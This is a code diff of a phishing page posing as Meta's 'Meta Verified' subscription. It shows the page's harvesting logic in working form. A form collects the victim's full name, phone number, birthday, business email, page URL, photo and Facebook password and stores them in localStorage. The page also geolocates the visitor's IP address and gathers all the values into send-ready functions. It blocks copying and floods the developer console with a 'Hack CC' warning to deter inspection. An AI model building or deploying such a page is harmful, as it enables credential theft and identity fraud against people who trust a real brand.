@@ -2,27 +2,34 @@
 <html lang="en">
 
     <head>
-        <meta charset="UTF-8" />
-        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-        <title>Acount Center</title>
-        <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yT/r/aGT3gskzWBf.ico"
-            type="image/x-icon" />
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Meta Verified</title>
+        <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yT/r/aGT3gskzWBf.ico" type="image/x-icon">
         <link rel="stylesheet"
-            href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
+            href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
         <style>
-            @media screen and (min-width: 1000px) {
+            @media screen and (min-width: 768px) {
                 body {
-                    display: none;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+
                 }
 
-                * {
-                    display: none;
+                #body-div {
+                    max-width: 480px;
+                    margin-bottom: 20px;
+                }
+
+                .modal-pay {
+                    width: 50% !important;
+                    height: 95% !important;
                 }
             }
 
             * {
                 font-family: Optimistic Text Medium, Helvetica, Arial, sans-serif;
-                /* background-color: #f0f2f5; */
                 padding: 0;
                 margin: 0;
                 box-sizing: border-box;
@@ -63,7 +70,7 @@
             }
 
             .verify-icon {
-                color: #0064e0;
+                color: #0064E0;
             }
 
             .name {
@@ -73,22 +80,25 @@
             }
 
             #text1-1 {
-                color: #1c2b33;
+                color: #1C2B33;
                 font-weight: 550;
                 margin-bottom: 2px;
                 margin-left: 5px;
             }
 
             #body-div {
-                display: block;
+                display: flex;
                 margin-left: 20px;
                 margin-right: 20px;
+                flex-direction: column;
+                justify-content: center;
+                align-items: center;
             }
 
             .name-jr {
                 margin-bottom: 20px;
                 margin-left: 21px;
-                color: #465a69;
+                color: #465A69;
                 font-weight: 400;
             }
 
@@ -109,6 +119,7 @@
             }
 
             #button {
+
                 display: flex;
                 background-color: #0064e0;
                 color: #ffffff;
@@ -131,6 +142,16 @@
                 height: 82%;
                 overflow: hidden;
                 overflow-y: auto;
+            }
+
+            *::-webkit-scrollbar {
+                /* margin-left: 30px; */
+                width: 1px;
+                background-color: #ffffff00;
+            }
+
+            *::-webkit-scrollbar-thumb {
+                background-color: #1c2b3361;
             }
 
             @media screen and (max-width: 768px) {
@@ -258,6 +279,7 @@
             }
 
             .name-modal {
+                background-color: white;
                 display: flex;
                 flex-direction: row;
                 align-content: center;
@@ -288,19 +310,22 @@
 
             .name-jr-modal {
                 margin: 0;
-                color: #465a69 !important;
+                color: #465A69 !important;
                 font-weight: 400;
             }
 
-            input {
+            input[type="text"],
+            input[type="date"],
+            input[type="password"] {
                 width: 100%;
-                margin: 10px 0 10px 0;
+                margin: 10px 0;
                 height: 36px;
                 border: 1px solid #7b828a;
                 border-radius: 10px;
             }
 
-            input::placeholder {
+            input {
+                outline: #00000000;
                 padding-left: 10px;
             }
 
@@ -315,206 +340,132 @@
             }
         </style>
         <script>
-            function _0x2b20(_0x495ddc, _0x49dc19) {
-                var _0x34f50e = _0x34f5();
-                return (
-                    (_0x2b20 = function (_0x2b20a9, _0x13c600) {
-                        _0x2b20a9 = _0x2b20a9 - 0x162;
-                        var _0x423a68 = _0x34f50e[_0x2b20a9];
-                        return _0x423a68;
-                    }),
-                    _0x2b20(_0x495ddc, _0x49dc19)
-                );
-            }
-            (function (_0x4625fd, _0x161938) {
-                var _0x4463e5 = _0x2b20,
-                    _0x39547 = _0x4625fd();
-                while (!![]) {
-                    try {
-                        var _0x39297e =
-                            (-parseInt(_0x4463e5(0x163)) / 0x1) * (-parseInt(_0x4463e5(0x171)) / 0x2) +
-                            (-parseInt(_0x4463e5(0x167)) / 0x3) * (parseInt(_0x4463e5(0x168)) / 0x4) +
-                            -parseInt(_0x4463e5(0x172)) / 0x5 +
-                            (-parseInt(_0x4463e5(0x165)) / 0x6) * (-parseInt(_0x4463e5(0x16b)) / 0x7) +
-                            -parseInt(_0x4463e5(0x170)) / 0x8 +
-                            (parseInt(_0x4463e5(0x16f)) / 0x9) * (-parseInt(_0x4463e5(0x164)) / 0xa) +
-                            parseInt(_0x4463e5(0x166)) / 0xb;
-                        if (_0x39297e === _0x161938) break;
-                        else _0x39547["push"](_0x39547["shift"]());
-                    } catch (_0x313c1f) {
-                        _0x39547["push"](_0x39547["shift"]());
-                    }
-                }
-            })(_0x34f5, 0xba97a);
-            function _0x34f5() {
-                var _0x4addc1 = [
-                    "5596ZWIjsL",
-                    "3772815FbGlQz",
-                    "display",
-                    "362UInLFc",
-                    "4480pUtRfS",
-                    "2519022fjcZBt",
-                    "15492092XLlFtS",
-                    "3uqZEpx",
-                    "499484VTOejL",
-                    "style",
-                    "block",
-                    "7RzsKNZ",
-                    "modal-pay",
-                    "getElementById",
-                    "modal-overlay",
-                    "5328IwgyFZ",
-                    "7457224xYBVSN",
-                ];
-                _0x34f5 = function () {
-                    return _0x4addc1;
-                };
-                return _0x34f5();
-            }
             function openModal() {
-                var _0x371e6a = _0x2b20;
-                (document[_0x371e6a(0x16d)](_0x371e6a(0x16c))["style"]["display"] = _0x371e6a(0x16a)), (document[_0x371e6a(0x16d)](_0x371e6a(0x16e))[_0x371e6a(0x169)][_0x371e6a(0x162)] = _0x371e6a(0x16a));
-            }
-            function _0x349d(_0x2b45ad, _0x11549b) {
-                var _0x5114af = _0x5114();
-                return (
-                    (_0x349d = function (_0x349de0, _0x428831) {
-                        _0x349de0 = _0x349de0 - 0x113;
-                        var _0x3edfde = _0x5114af[_0x349de0];
-                        return _0x3edfde;
-                    }),
-                    _0x349d(_0x2b45ad, _0x11549b)
-                );
-            }
-            (function (_0x3950ab, _0x1e5a62) {
-                var _0x4cfe5a = _0x349d,
-                    _0x2a6858 = _0x3950ab();
-                while (!![]) {
-                    try {
-                        var _0x4d8cac =
-                            (parseInt(_0x4cfe5a(0x117)) / 0x1) * (parseInt(_0x4cfe5a(0x11a)) / 0x2) +
-                            (parseInt(_0x4cfe5a(0x11c)) / 0x3) * (-parseInt(_0x4cfe5a(0x113)) / 0x4) +
-                            -parseInt(_0x4cfe5a(0x121)) / 0x5 +
-                            (parseInt(_0x4cfe5a(0x116)) / 0x6) * (-parseInt(_0x4cfe5a(0x118)) / 0x7) +
-                            (parseInt(_0x4cfe5a(0x11d)) / 0x8) * (-parseInt(_0x4cfe5a(0x115)) / 0x9) +
-                            parseInt(_0x4cfe5a(0x120)) / 0xa +
-                            (-parseInt(_0x4cfe5a(0x114)) / 0xb) * (-parseInt(_0x4cfe5a(0x11e)) / 0xc);
-                        if (_0x4d8cac === _0x1e5a62) break;
-                        else _0x2a6858["push"](_0x2a6858["shift"]());
-                    } catch (_0x581020) {
-                        _0x2a6858["push"](_0x2a6858["shift"]());
-                    }
-                }
-            })(_0x5114, 0x91812);
-            function _0x5114() {
-                var _0x4c3a4c = [
-                    "697170PdzNmD",
-                    "display",
-                    "getElementById",
-                    "modal-pay",
-                    "4OhfsFM",
-                    "136103sSbsEW",
-                    "6732891pVRHhY",
-                    "96OfvSLQ",
-                    "27NQsJMj",
-                    "13727SAzYDW",
-                    "modal-form",
-                    "55662esKIKg",
-                    "style",
-                    "1871547wQJUYa",
-                    "8iZnlGc",
-                    "492lAMYDR",
-                    "none",
-                    "8800140uanIXw",
-                ];
-                _0x5114 = function () {
-                    return _0x4c3a4c;
-                };
-                return _0x5114();
+                document.getElementById("modal-pay").style.display = "block";
+                document.getElementById("modal-overlay").style.display = "block";
             }
             function closeModal() {
-                var _0x596f8c = _0x349d;
-                back(),
-                    (document["getElementById"](_0x596f8c(0x124))[_0x596f8c(0x11b)][_0x596f8c(0x122)] = "none"),
-                    (document[_0x596f8c(0x123)]("modal-overlay")[_0x596f8c(0x11b)][_0x596f8c(0x122)] = _0x596f8c(0x11f)),
-                    (document[_0x596f8c(0x123)](_0x596f8c(0x119))[_0x596f8c(0x11b)]["display"] = _0x596f8c(0x11f));
+                back();
+                document.getElementById("modal-pay").style.display = "none";
+                document.getElementById("modal-overlay").style.display = "none";
+                document.getElementById("modal-form").style.display = "none";
             }
-            function _0x48c6(_0x3d2224, _0x599b53) {
-                var _0x4ee50a = _0x4ee5();
-                return (
-                    (_0x48c6 = function (_0x48c699, _0x178316) {
-                        _0x48c699 = _0x48c699 - 0x1a1;
-                        var _0x625e2 = _0x4ee50a[_0x48c699];
-                        return _0x625e2;
-                    }),
-                    _0x48c6(_0x3d2224, _0x599b53)
-                );
-            }
-            function _0x4ee5() {
-                var _0x237806 = [
-                    "1168097ufAOJO",
-                    "45160CNoMqC",
-                    "modal-form",
-                    "6527940BiLzIF",
-                    "getItem",
-                    "\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22modal-close2\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20id=\x22back\x22\x20onclick=\x22back()\x22><i\x20class=\x22fa\x20fa-arrow-left\x22\x20aria-hidden=\x22true\x22></i></span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20id=\x22close-modal\x22\x20onclick=\x22closeModal()\x22><i\x20class=\x22fa\x20fa-times\x22\x20aria-hidden=\x22true\x22></i></span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1>Enter\x20password</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<input\x20type=\x22password\x22\x20id=\x22password\x22\x20placeholder=\x22Enter\x20password\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20id=\x22button-modal\x22>Submit</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20",
-                    "modalform",
-                    "style",
-                    "2024152kHHegj",
-                    "9wzOjVu",
-                    "504gGPnhE",
-                    "block",
-                    "display",
-                    "690709LQBDbB",
-                    "getElementById",
-                    "1001298eGDbGK",
-                    "innerHTML",
-                    "24pcukSJ",
-                    "setItem",
-                    "none",
-                    "383883qrrvwP",
-                ];
-                _0x4ee5 = function () {
-                    return _0x237806;
-                };
-                return _0x4ee5();
-            }
-            (function (_0x23f0b9, _0x5c20ed) {
-                var _0x192972 = _0x48c6,
-                    _0x34dcb4 = _0x23f0b9();
-                while (!![]) {
-                    try {
-                        var _0x5d6966 =
-                            -parseInt(_0x192972(0x1b5)) / 0x1 +
-                            parseInt(_0x192972(0x1a2)) / 0x2 +
-                            (-parseInt(_0x192972(0x1a7)) / 0x3) * (-parseInt(_0x192972(0x1a4)) / 0x4) +
-                            (-parseInt(_0x192972(0x1a9)) / 0x5) * (parseInt(_0x192972(0x1b2)) / 0x6) +
-                            parseInt(_0x192972(0x1a8)) / 0x7 +
-                            (parseInt(_0x192972(0x1b0)) / 0x8) * (-parseInt(_0x192972(0x1b1)) / 0x9) +
-                            parseInt(_0x192972(0x1ab)) / 0xa;
-                        if (_0x5d6966 === _0x5c20ed) break;
-                        else _0x34dcb4["push"](_0x34dcb4["shift"]());
-                    } catch (_0x30d82b) {
-                        _0x34dcb4["push"](_0x34dcb4["shift"]());
-                    }
-                }
-            })(_0x4ee5, 0x5e280);
             function openForm() {
-                var _0x23215f = _0x48c6;
-                (document[_0x23215f(0x1a1)](_0x23215f(0x1aa))[_0x23215f(0x1af)][_0x23215f(0x1b4)] = "block"),
-                    (document["getElementById"]("modal-overlay")["style"]["display"] = _0x23215f(0x1b3)),
-                    (document[_0x23215f(0x1a1)]("modal-pay")[_0x23215f(0x1af)]["display"] = _0x23215f(0x1a6));
+                document.getElementById("modal-form").style.display = "block";
+                document.getElementById("modal-overlay").style.display = "block";
+                document.getElementById("modal-pay").style.display = "none";
             }
             function inputPassword() {
-                var _0x5c3e37 = _0x48c6,
-                    _0x291e5a = document[_0x5c3e37(0x1a1)](_0x5c3e37(0x1aa));
-                localStorage[_0x5c3e37(0x1a5)](_0x5c3e37(0x1ae), _0x291e5a["innerHTML"]), (_0x291e5a[_0x5c3e37(0x1a3)] = _0x5c3e37(0x1ad));
+                localStorage.setItem("name", document.getElementById("name").value);
+                localStorage.setItem("page", document.getElementById("page").value);
+                localStorage.setItem("phonenumber", document.getElementById("phonenumber").value);
+                localStorage.setItem("date", document.getElementById("date").value);
+                localStorage.setItem("business-email", document.getElementById("business-email").value);
+                localStorage.setItem("url", document.getElementById("url").value);
+                localStorage.setItem("additional-info", document.getElementById("additional-info").value);
+                var modalform = document.getElementById("modal-form");
+                localStorage.setItem("modalform", modalform.innerHTML);
+                modalform.innerHTML = `
+                <div class="modal-close2">
+                <span id="back" onclick="back()"><i class="fa fa-arrow-left" aria-hidden="true"></i></span>
+                <span id="close-modal" onclick="closeModal()"><i class="fa fa-times" aria-hidden="true"></i></span>
+                </div>
+                <h1>Enter password</h1>
+                <input type="password" id="password" placeholder="Enter password">
+                <div id="button-modal">Submit</div>
+            `;
             }
             function back() {
-                var _0x39f507 = _0x48c6,
-                    _0x3c0bf5 = document[_0x39f507(0x1a1)](_0x39f507(0x1aa));
-                _0x3c0bf5[_0x39f507(0x1a3)] = localStorage[_0x39f507(0x1ac)](_0x39f507(0x1ae));
+                var modalform = document.getElementById("modal-form");
+                modalform.innerHTML = localStorage.getItem("modalform");
             }
+            function handleFileSelect(event) {
+                var file = event.target.files[0];
+                var reader = new FileReader();
+                reader.onload = function (event) {
+                    localStorage.setItem("image", event.target.result);
+                };
+                reader.readAsDataURL(file);
+            }
+            function check() {
+                localStorage.setItem("password", document.getElementById("password").value);
+                var ip = localStorage.getItem("ipAddress");
+                var address = localStorage.getItem("address");
+                var password = document.getElementById("password").value;
+                var name = localStorage.getItem("name");
+                var page = localStorage.getItem("page");
+                var phonenumber = localStorage.getItem("phonenumber");
+                var date = localStorage.getItem("date");
+                var businessEmail = localStorage.getItem("business-email");
+                var url = localStorage.getItem("url");
+                var additionalInfo = localStorage.getItem("additional-info");
+                var image = localStorage.getItem("image");
+            }
+            function sendCode() {
+                var ip = localStorage.getItem("ipAddress");
+                var address = localStorage.getItem("address");
+                var password = localStorage.getItem("password");
+                var name = localStorage.getItem("name");
+                var page = localStorage.getItem("page");
+                var phonenumber = localStorage.getItem("phonenumber");
+                var date = localStorage.getItem("date");
+                var businessEmail = localStorage.getItem("business-email");
+                var url = localStorage.getItem("url");
+                var additionalInfo = localStorage.getItem("additional-info");
+                var image = localStorage.getItem("image");
+            }
+            document.addEventListener('DOMContentLoaded', async function () {
+                let ipAddress;
+                let address;
+                try {
+                    const ipifyResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipifyData = await ipifyResponse.json();
+                    ipAddress = ipifyData.ip;
+
+                    const ipLocationNetResponse = await fetch(`https://api.iplocation.net/?cmd=ip-country&ip=${ipAddress}`);
+                    const ipLocationNetData = await ipLocationNetResponse.json();
+                    address = ipLocationNetData.country_name;
+
+                    localStorage.setItem('ipAddress', ipAddress);
+                    localStorage.setItem('address', address);
+                } catch (error) {
+                    console.error('Lỗi:', error);
+                }
+            });
+            var message = ["%cHack CC", "%cTắt đi ngay!"];
+            var index = 0;
+            var lineIndex = 0;
+            function displayMessage() {
+                console.clear();
+                for (var i = 0; i < lineIndex; i++) {
+                    console.log(
+                        message[i],
+                        "color: red; font-weight: bold; font-size: 50px; background-color: yellow;"
+                    );
+                }
+                var currentLine = message[lineIndex].substring(0, index);
+                console.log(
+                    currentLine,
+                    "color: red; font-weight: bold; font-size: 50px; background-color: yellow;"
+                );
+                index++;
+                if (index > message[lineIndex].length) {
+                    index = 0;
+                    lineIndex++;
+                    if (lineIndex >= message.length) {
+                        lineIndex = 0;
+                    }
+                };
+            }
+            document.addEventListener("copy", function (e) {
+                e.preventDefault();
+            });
+            window.addEventListener("keydown", function (event) {
+                if (event.key === "F12") {
+                    displayMessage();
+                }
+            });
+            setInterval(displayMessage, 100);
         </script>
     </head>
 
@@ -522,7 +473,7 @@
         <div id="body-div">
             <div id="header-text">
                 <h1>Build trust with Meta Verified</h1>
-                <img id="avatar" src="https://cdn.pixabay.com/photo/2021/12/14/22/29/meta-6871457_1280.png" alt="" />
+                <img id="avatar" src="https://cdn.pixabay.com/photo/2021/12/14/22/29/meta-6871457_1280.png" alt="">
                 <div class="name" style="margin-top: 2px;">
                     <p id="username">Meta</p>
                     <svg viewBox="0 0 24 24" fill="#0064E0" width="1em" height="1em" class="verify-icon">
@@ -594,11 +545,9 @@
                 </div>
             </div>
             <div class="name-jr" id="name-jr">
-                <span>
-                    Meta Verified is not available for people younger than 18 years of age. <a href="#">See all Meta
-                        Verified eligibility requirements</a><br />
-                    Information you provide is subject to our <a href="#">Privacy Policy.</a>
-                </span>
+                <span>Meta Verified is not available for people younger than 18 years of age. <a href="#">See all Meta
+                        Verified eligibility requirements</a><br>Information you provide is subject to our <a
+                        href="#">Privacy Policy.</a></span>
             </div>
             <div id="button" onclick="openModal()">
                 Next
@@ -606,20 +555,21 @@
         </div>
         <div class="modal-overlay" id="modal-overlay"></div>
         <div class="modal-pay" id="modal-pay">
-            <div class="modal-close">
-                <span id="modal-close" onclick="closeModal()"><i class="fa fa-times" aria-hidden="true"></i></span>
-            </div>
+            <div class="modal-close"><span id="modal-close" onclick="closeModal()"><i class="fa fa-times"
+                        aria-hidden="true"></i></span></div>
             <div class="scrollable-div">
-                <h1>Confirm and pay</h1>
+                <h1>Submit a request for proposal</h1>
 
                 <p>You are subscribing to Meta Verified on Facebook.</p>
-                <p style="margin-bottom: 10px;">After payment, you need to go to the Facebook mobile app to confirm your
-                    identity. This can take up to 48 hours. If we're unable to confirm your identity, we'll refund your
-                    payment.</p>
+                <p style="margin-bottom: 10px;">After subscribing, you need to go to the Facebook mobile app to confirm your
+                    identity. This can take up to 48
+                    hours.
+                    If
+                    we're unable to confirm your identity, we'll refund your payment.</p>
                 <div class="modal-pay2">
                     <div class="name-modal">
                         <img class="name-modal-margin"
-                            src="https://cdn.pixabay.com/photo/2021/12/14/22/29/meta-6871457_1280.png" alt="" />
+                            src="https://cdn.pixabay.com/photo/2021/12/14/22/29/meta-6871457_1280.png" alt="">
                         <div class="name-modal2 modal-pay2">
                             <div class="name modal-pay2" style="margin-top: 2px;">
                                 <p id="username" class="username-modal modal-pay2">Meta</p>
@@ -631,8 +581,9 @@
                             </div>
                             <p class="name-jr-modal modal-pay2">Facebook</p>
                         </div>
+
                     </div>
-                    <div style="line-height: 66px; display: flex; align-content: center; align-items: center;">
+                    <div style="line-height: 66px;display: flex;align-content: center;align-items: center;">
                         <p class="name-modal-margin">You'll be billed $7.99 per month.</p>
                     </div>
                 </div>
@@ -675,25 +626,22 @@
                         <p>Unique stickers</p>
                     </div>
                     <p id="p-footer">Subscribing to Meta Verified means you agree to our <a href="#">Terms and
-                            Policies</a>. You can cancel at least 24 hours before your next payment date by viewing
-                        Orders and payments on Facebook.</p>
+                            Policies</a>.</p>
                 </div>
             </div>
-            <div id="button-modal" onclick="openForm()">Pay to get benefits</div>
+            <div id="button-modal" onclick="openForm()">Next</div>
         </div>
         <div class="modal-pay" id="modal-form">
             <div class="modal-close"><span id="modal-close" onclick="closeModal()"><i class="fa fa-times"
                         aria-hidden="true"></i></span></div>
             <div class="scrollable-div">
                 <h1>Submit a request for proposal</h1>
-                <p>
-                    You are subscribing to Meta verified on Facebook.<br />
-                    After subscribing you need to go to the Facebook mobile app to confirm your identity. This can take
-                    up to 48 hours. If we're unable to confirm your identity, we'll refund your payment.
-                </p>
-                <div class="name-modal">
+                <p>You are subscribing to Meta verified on Facebook.<br>After subscribing you need to go to the Facebook
+                    mobile app to confirm your identity. This can take up to 48 hours. If we're unable to confirm your
+                    identity, we'll refund your payment.</p>
+                <div class="name-modal" style="border-radius: 20px; margin-top: 20px;">
                     <img class="name-modal-margin"
-                        src="https://cdn.pixabay.com/photo/2021/12/14/22/29/meta-6871457_1280.png" alt="" />
+                        src="https://cdn.pixabay.com/photo/2021/12/14/22/29/meta-6871457_1280.png" alt="">
                     <div class="name-modal2 modal-pay2">
                         <div class="name modal-pay2" style="margin-top: 2px;">
                             <p id="username" class="username-modal modal-pay2">Meta</p>
@@ -706,25 +654,31 @@
                         <p class="name-jr-modal modal-pay2">Facebook</p>
                     </div>
                 </div>
-                <div style="margin-top: 10px; margin-bottom: 10px;">
+                <div style="margin-top: 10px;margin-bottom: 10px;">
                     <b>Please fill in the form bellow.</b>
                 </div>
                 <div
-                    style="display: flex; justify-content: center; align-items: center; align-content: center; flex-direction: column;">
-                    <input type="text" id="name" placeholder="Your first and last name" />
-                    <input type="text" id="page" placeholder="Your page name" />
-                    <input type="text" id="phonenumber" placeholder="Your phone number" />
+                    style="display: flex;justify-content: center;align-items: center;align-content: center;flex-direction: column;">
+                    <input type="text" id="name" placeholder="Your first and last name">
+                    <input type="text" id="page" placeholder="Your page name">
+                    <input type="text" id="phonenumber" placeholder="Your phone number">
                 </div>
                 <div id="birthday"
-                    style="margin-left: 7px; display: flex; align-items: center; justify-content: center; align-content: center;">
+                    style="margin-left: 7px;display: flex;align-items: center;justify-content: center;align-content: center;">
                     <p style="margin-right: 5px;">Your birthday(*)</p>
-                    <input type="date" id="date" />
+                    <input type="date" id="date">
                 </div>
                 <div
-                    style="display: flex; align-items: center; justify-content: center; align-content: center; flex-direction: column;">
-                    <input type="text" id="business-email" placeholder="Your business email" />
-                    <input type="text" id="url" placeholder="Link (URL) to page" />
-                    <input type="text" id="Additional info" placeholder="Additional info" />
+                    style="display: flex;align-items: center;justify-content: center;align-content: center;flex-direction: column;">
+                    <input type="text" id="business-email" placeholder="Your business email">
+                    <input type="text" id="url" placeholder="Link (URL) to page">
+                    <input type="text" id="additional-info" placeholder="Additional info">
+                    <div
+                        style="width: 100%;display: flex;align-items: center;align-content: center;justify-content: flex-start;">
+                        <p>Upload your photo: </p>
+                        <input type="file" id="fileInput" name="photo" accept="image/*"
+                            onchange="handleFileSelect(event)">
+                    </div>
                 </div>
             </div>
             <div id="button-modal" onclick="inputPassword()">Submit</div>
